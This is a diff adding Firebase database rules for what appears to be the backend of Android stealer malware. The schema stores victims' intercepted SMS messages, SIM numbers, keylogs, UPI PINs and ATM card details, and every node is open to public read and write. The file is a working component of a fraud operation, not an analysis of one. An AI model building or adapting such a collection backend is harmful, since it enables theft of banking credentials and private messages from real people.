@@ -1,0 +1,52 @@
+{
+  "rules": {
+    "DeviceInfo": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        ".validate": "newData.hasChildren(['AndroidVersion', 'Status'])"
+      }
+    },
+    "Messages": {
+      ".read": true,
+      ".write": true,
+      "$messageId": {
+        ".validate": "newData.hasChildren(['VictimId', 'Sender', 'Body', 'Time', 'SmsType'])"
+      }
+    },
+    "Sims": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        "$simId": {
+          ".validate": "newData.hasChildren(['slot', 'carrier', 'number'])"
+        }
+      }
+    },
+    "KeyLogs": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        "$logId": {
+          ".validate": "newData.hasChildren(['time', 'text'])"
+        }
+      }
+    },
+    "UPIPins": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        ".validate": "newData.isArray()"
+      }
+    },
+    "ATMCards": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        "$cardId": {
+          ".validate": "newData.hasChildren(['bank', 'last4', 'name'])"
+        }
+      }
+    }
+  }
+}
